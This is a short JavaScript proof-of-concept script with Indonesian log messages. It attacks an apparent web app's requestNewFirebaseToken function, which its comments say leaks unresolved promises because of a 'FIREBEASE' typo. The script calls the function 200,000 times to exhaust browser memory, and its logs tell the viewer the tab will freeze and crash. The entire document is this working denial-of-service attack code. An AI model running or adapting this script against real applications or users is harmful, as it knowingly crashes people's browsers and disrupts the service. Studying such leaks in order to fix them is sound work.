// --- Memory Leak Exploit: Crashing the Tab via Typo ---

function runMemoryLeakAttack() {
    log("Memulai Serangan Memory Leak: Mengeksploitasi typo 'FIREBEASE'...");

    if (typeof window.requestNewFirebaseToken !== 'function') {
        log("GAGAL: Fungsi `requestNewFirebaseToken` tidak ditemukan.");
        return;
    }
    
    // Objek `pendingTokenPromises` tidak diekspos secara global,
    // jadi kita tidak bisa mengaksesnya secara langsung dari sini.
    // Namun, kita tahu dari kode sumber bahwa kebocoran itu ada.

    const leakCount = 200000; // Jumlah yang cukup besar untuk menyebabkan crash.
    log(`Akan memanggil requestNewFirebaseToken() sebanyak ${leakCount} kali.`);
    log("Setiap panggilan akan membocorkan memori karena promise tidak pernah diselesaikan.");
    log("Amati browser Anda. Ia akan menjadi lambat dan akhirnya crash.");
    log("Ini adalah bukti nyata dari kerentanan tersebut.");

    // Beri waktu agar log muncul sebelum memulai serangan intensif.
    setTimeout(() => {
        try {
            for (let i = 0; i < leakCount; i++) {
                // Setiap panggilan ini menambahkan promise ke antrian yang tidak pernah dibersihkan.
                window.requestNewFirebaseToken();
            }
            log("🔥 SERANGAN SELESAI. Kebocoran memori telah terjadi.");
            log("Jika browser belum crash, ia akan segera menjadi sangat tidak responsif.");
        } catch (e) {
            log(`CRITICAL ERROR selama serangan: ${e.name} - ${e.message}`);
        }
    }, 500);
}

runMemoryLeakAttack();